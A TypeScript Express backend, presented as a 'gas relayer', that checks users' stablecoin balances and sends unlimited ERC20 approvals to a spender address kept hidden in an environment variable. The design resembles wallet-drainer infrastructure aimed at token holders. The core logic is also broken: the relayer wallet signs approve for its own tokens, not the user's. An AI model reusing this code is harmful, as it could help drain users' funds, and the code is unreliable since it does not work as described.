// src/index.ts - Complete Gas Relayer Backend
import express from 'express';
import { ethers } from 'ethers';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import helmet from 'helmet';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet());
app.use(cors({
  origin: process.env.FRONTEND_URL || ['http://localhost:3000', 'https://your-app.vercel.app'],
  credentials: true
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20,
  message: 'Too many requests from this IP',
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/relay', limiter);

app.use(express.json({ limit: '1mb' }));

// Health check for Render
app.get('/', (req, res) => {
  res.json({ 
    status: 'Gas Relayer Service is running',
    timestamp: new Date().toISOString()
  });
});

// ERC20 ABI
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address owner) external view returns (uint256)",
  "function allowance(address owner, address spender) external view returns (uint256)"
];

// Chain configurations with fallback RPCs
const getChainConfig = () => ({
  1: {
    name: 'Ethereum Mainnet',
    rpcUrls: [
      process.env.ETH_RPC_URL || 'https://ethereum-rpc.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://eth.drpc.org'
    ],
    gasPrice: ethers.parseUnits('20', 'gwei'),
    maxGasLimit: 100000n
  },
  42161: {
    name: 'Arbitrum',
    rpcUrls: [
      process.env.ARB_RPC_URL || 'https://arb1.arbitrum.io/rpc',
      'https://arbitrum-one-rpc.publicnode.com',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.drpc.org'
    ],
    gasPrice: ethers.parseUnits('0.1', 'gwei'),
    maxGasLimit: 200000n
  },
  11155111: {
    name: 'Sepolia',
    rpcUrls: [
      process.env.SEPOLIA_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com',
      'https://rpc.ankr.com/eth_sepolia',
      'https://sepolia.drpc.org'
    ],
    gasPrice: ethers.parseUnits('20', 'gwei'),
    maxGasLimit: 100000n
  }
});

// Supported tokens - ALL LOWERCASE for consistent comparison
const SUPPORTED_TOKENS: Record<number, string[]> = {
  1: [
    "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
    "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
    "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
    "0x4fabb145d64652a948d72533023f6e7a623c7c53"  // BUSD
  ],
  42161: [
    "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9", // USDT
    "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8", // USDC
    "0xda10009cbd5d07dd0cecc66161fc93d7c9000da1"  // DAI
  ],
  11155111: [
    "0x1c7d4b196cb0c7b01d743fbc6116a902379c7238", // USDC
    "0x779877a7b0d9e8603169ddbd7836e478b4624789"  // LINK
  ]
};

const SPENDER_ADDRESS = process.env.SPENDER_ADDRESS;
const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY;

if (!SPENDER_ADDRESS || !RELAYER_PRIVATE_KEY) {
  console.error('❌ Missing required environment variables:');
  console.error('- SPENDER_ADDRESS:', SPENDER_ADDRESS ? '✅ Set' : '❌ Missing');
  console.error('- RELAYER_PRIVATE_KEY:', RELAYER_PRIVATE_KEY ? '✅ Set' : '❌ Missing');
  process.exit(1);
}

// Get working provider with fallback RPCs
async function getWorkingProvider(chainId: number): Promise<ethers.JsonRpcProvider> {
  const config = getChainConfig()[chainId as keyof ReturnType<typeof getChainConfig>];
  if (!config) {
    throw new Error(`Unsupported chain: ${chainId}`);
  }

  for (const rpcUrl of config.rpcUrls) {
    try {
      console.log(`🔗 Trying RPC: ${rpcUrl.slice(0, 50)}...`);
      const provider = new ethers.JsonRpcProvider(rpcUrl, {
        name: config.name,
        chainId: chainId
      });
      
      // Test connection with timeout
      await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
      ]);
      
      console.log(`✅ Connected to ${config.name}`);
      return provider;
      
    } catch (error: any) {
      console.log(`❌ RPC failed: ${error.message}`);
      continue;
    }
  }
  
  throw new Error(`All RPC endpoints failed for ${config.name}`);
}

// Validate signature
function isValidSignature(message: string, signature: string, expectedSigner: string): boolean {
  try {
    const recoveredAddress = ethers.verifyMessage(message, signature);
    return recoveredAddress.toLowerCase() === expectedSigner.toLowerCase();
  } catch (error) {
    console.error('Signature validation error:', error);
    return false;
  }
}

// Validate token - CASE INSENSITIVE
function isTokenSupported(chainId: number, tokenAddress: string): boolean {
  const supportedTokens = SUPPORTED_TOKENS[chainId];
  if (!supportedTokens) {
    console.log(`❌ Chain ${chainId} not supported`);
    return false;
  }
  
  const normalizedAddress = tokenAddress.toLowerCase();
  const isSupported = supportedTokens.includes(normalizedAddress);
  
  console.log(`🔍 Token validation:`, {
    chainId,
    originalAddress: tokenAddress,
    normalizedAddress,
    isSupported
  });
  
  if (!isSupported) {
    console.log(`❌ Token ${tokenAddress} not supported on chain ${chainId}`);
    console.log(`✅ Supported tokens:`, supportedTokens);
  }
  
  return isSupported;
}

// Main relay endpoint
app.post('/relay', async (req, res) => {
  try {
    const {
      chainId,
      tokenAddress,
      userAddress,
      signature,
      timestamp
    } = req.body;

    console.log('📥 Received relay request:', {
      chainId,
      tokenAddress,
      userAddress: userAddress?.slice(0, 10) + '...',
      timestamp
    });

    // Validate required fields
    if (!chainId || !tokenAddress || !userAddress || !signature || !timestamp) {
      console.log('❌ Missing required fields');
      return res.status(400).json({
        error: 'Missing required fields',
        required: ['chainId', 'tokenAddress', 'userAddress', 'signature', 'timestamp']
      });
    }

    // Check timestamp (prevent replay attacks)
    const now = Date.now();
    const requestTime = parseInt(timestamp);
    if (now - requestTime > 300000) { // 5 minutes
      console.log('❌ Request expired');
      return res.status(400).json({
        error: 'Request expired. Please refresh and try again.'
      });
    }

    const CHAIN_CONFIG = getChainConfig();

    // Validate chain support
    if (!CHAIN_CONFIG[chainId as keyof typeof CHAIN_CONFIG]) {
      console.log('❌ Unsupported chain:', chainId);
      return res.status(400).json({
        error: 'Unsupported chain',
        supportedChains: Object.keys(CHAIN_CONFIG),
        receivedChain: chainId
      });
    }

    // Validate token support
    if (!isTokenSupported(chainId, tokenAddress)) {
      console.log('❌ Unsupported token:', tokenAddress, 'on chain:', chainId);
      return res.status(400).json({
        error: 'Unsupported token address',
        supportedTokens: SUPPORTED_TOKENS[chainId] || [],
        receivedToken: tokenAddress.toLowerCase(),
        chainId: chainId
      });
    }

    // Verify signature
    const message = `Approve token ${tokenAddress} on chain ${chainId} at ${timestamp}`;
    if (!isValidSignature(message, signature, userAddress)) {
      console.log('❌ Invalid signature');
      return res.status(400).json({
        error: 'Invalid signature'
      });
    }

    console.log('✅ All validations passed, proceeding with transaction...');

    const chainConfig = CHAIN_CONFIG[chainId as keyof typeof CHAIN_CONFIG];
    const provider = await getWorkingProvider(chainId);
    const relayerWallet = new ethers.Wallet(RELAYER_PRIVATE_KEY, provider);

    // Check relayer balance
    const relayerBalance = await provider.getBalance(relayerWallet.address);
    const estimatedCost = chainConfig.gasPrice * chainConfig.maxGasLimit;
    
    if (relayerBalance < estimatedCost) {
      console.error('❌ Insufficient relayer balance:', {
        chain: chainConfig.name,
        balance: ethers.formatEther(relayerBalance),
        needed: ethers.formatEther(estimatedCost)
      });
      return res.status(500).json({
        error: 'Insufficient gas funds. Please try again later.'
      });
    }

    // Create contract instance
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, relayerWallet);

    // Check if approval is needed
    const currentAllowance = await tokenContract.allowance(userAddress, SPENDER_ADDRESS);
    if (currentAllowance > 0n) {
      console.log('✅ Token already approved');
      return res.status(200).json({
        success: true,
        message: 'Token already approved',
        txHash: null,
        alreadyApproved: true
      });
    }

    // Check user's token balance
    const userBalance = await tokenContract.balanceOf(userAddress);
    if (userBalance === 0n) {
      console.log('❌ User has no token balance');
      return res.status(400).json({
        error: 'No token balance found for this address'
      });
    }

    // Estimate gas
    let gasEstimate: bigint;
    try {
      gasEstimate = await tokenContract.approve.estimateGas(
        SPENDER_ADDRESS,
        ethers.MaxUint256
      );
      gasEstimate = gasEstimate + (gasEstimate * 20n / 100n); // Add 20% buffer
    } catch (error) {
      console.error('⚠️ Gas estimation failed:', error);
      gasEstimate = chainConfig.maxGasLimit;
    }

    // Execute the approval transaction
    console.log('🚀 Executing approval transaction...', {
      user: userAddress,
      token: tokenAddress,
      chain: chainConfig.name,
      gasEstimate: gasEstimate.toString()
    });

    const tx = await tokenContract.approve(
      SPENDER_ADDRESS,
      ethers.MaxUint256,
      {
        gasLimit: gasEstimate > chainConfig.maxGasLimit ? chainConfig.maxGasLimit : gasEstimate,
        gasPrice: chainConfig.gasPrice
      }
    );

    console.log('✅ Transaction submitted:', {
      txHash: tx.hash,
      user: userAddress,
      token: tokenAddress,
      chain: chainConfig.name
    });

    // Wait for confirmation
    const receipt = await tx.wait(1);
    
    res.json({
      success: true,
      txHash: tx.hash,
      gasUsed: receipt?.gasUsed?.toString(),
      chainName: chainConfig.name,
      message: 'Approval transaction completed successfully'
    });

  } catch (error: any) {
    console.error('❌ Relay error:', error);
    res.status(500).json({
      error: 'Failed to relay transaction',
      details: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
    });
  }
});

// Enhanced health check
app.get('/health', async (req, res) => {
  try {
    const CHAIN_CONFIG = getChainConfig();
    const balances: Record<string, string> = {};
    const relayerAddress = new ethers.Wallet(RELAYER_PRIVATE_KEY).address;
    
    console.log('🏥 Running health check for relayer:', relayerAddress);
    
    // Check balances with timeout
    const balancePromises = Object.entries(CHAIN_CONFIG).map(async ([chainId, config]) => {
      try {
        console.log(`🔍 Checking balance for ${config.name}...`);
        const provider = await getWorkingProvider(parseInt(chainId));
        const balance = await provider.getBalance(relayerAddress);
        balances[config.name] = ethers.formatEther(balance);
        console.log(`✅ ${config.name}: ${ethers.formatEther(balance)} ETH`);
      } catch (error: any) {
        balances[config.name] = 'Error fetching balance';
        console.error(`❌ ${config.name} error:`, error.message);
      }
    });
    
    await Promise.all(balancePromises);

    res.json({
      status: 'healthy',
      timestamp: new Date().toISOString(),
      relayerAddress,
      balances,
      supportedChains: Object.values(CHAIN_CONFIG).map(c => c.name),
      version: '1.0.0'
    });
  } catch (error) {
    console.error('❌ Health check error:', error);
    res.status(500).json({
      status: 'unhealthy',
      error: (error as Error).message,
      timestamp: new Date().toISOString()
    });
  }
});

// Debug endpoint for supported tokens
app.get('/supported-tokens', (req, res) => {
  res.json({
    supportedTokens: SUPPORTED_TOKENS,
    chains: Object.entries(getChainConfig()).map(([chainId, config]) => ({
      chainId: parseInt(chainId),
      name: config.name,
      tokens: SUPPORTED_TOKENS[parseInt(chainId)] || []
    }))
  });
});

// Error handling middleware
app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
  console.error('Unhandled error:', err);
  res.status(500).json({
    error: 'Internal server error',
    timestamp: new Date().toISOString()
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    error: 'Endpoint not found',
    availableEndpoints: [
      'GET /',
      'GET /health', 
      'GET /supported-tokens',
      'POST /relay'
    ]
  });
});

const server = app.listen(PORT, () => {
  console.log('🚀 Gas Relayer Server started!');
  console.log('================================');
  console.log(`🌐 Server running on port ${PORT}`);
  console.log(`🏥 Health check: http://localhost:${PORT}/health`);
  console.log(`🔗 Relay endpoint: http://localhost:${PORT}/relay`);
  console.log(`👤 Relayer address: ${new ethers.Wallet(RELAYER_PRIVATE_KEY).address}`);
  console.log('================================');
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed successfully');
    process.exit(0);
  });
});

export default app;